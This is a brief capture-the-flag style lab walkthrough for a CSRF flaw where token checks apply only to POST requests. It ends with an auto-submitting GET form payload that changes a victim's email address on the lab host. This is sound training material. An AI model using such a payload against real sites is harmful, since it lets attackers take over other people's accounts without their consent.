Title: CSRF where token validation depends on request method
Level: PRACTITIONER
Desc:  This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough: 
Request to change email without csrf token: 
<img width="1336" height="456" alt="image" src="https://github.com/user-attachments/assets/c7af8dbf-d812-466f-9ea5-188078eab42e" />
Request to change email withrout csrf token, but with GET method:
<img width="1174" height="423" alt="image" src="https://github.com/user-attachments/assets/40c747ab-f8fe-42df-be74-dc90ccd46e15" />
So it is possible to send request without csrf token with GET method.

New payload: 
```
<form method="GET" action="https://0a76004d034b4dd980ad03b100280068.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test21@normal-user.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
send to victim.
